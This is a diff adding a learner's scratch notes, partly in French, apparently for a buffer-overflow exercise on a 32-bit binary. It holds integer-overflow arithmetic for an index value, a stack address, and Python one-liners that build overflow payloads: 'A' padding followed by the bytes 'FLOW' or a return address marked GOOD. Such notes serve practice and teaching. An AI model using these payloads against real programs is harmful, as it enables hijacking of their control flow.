@@ -1,0 +1,36 @@
+
+
+0x3c = 60
+0x40 = 64
+
+
+0xb7f65ee6
+
+4294967295 + 1 - 4 * -X = 60
+4294967296 + 4X = 60
+4X = -4294967236
+X = -1073741809
+
+4294967295 + 1 - 4 * -X = 84
+4294967296 + 4X = 84
+4X = -4294967212
+X = -1073741803 // GOOD
+
+
+
+ADRESSE de local_14 = 0xbffff71c
+
+Valeur a mettre : 
+0x574f4c46
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0000
+
+
+0x08048482
+
+python -c 'print "A" * 80'
+python -c 'print "A" * 80 + "\x46\x4c\x4f\x57"'
+
+
+python -c 'print "A" * 56 + "\x82\x84\x04\x08"' //GOOD
+
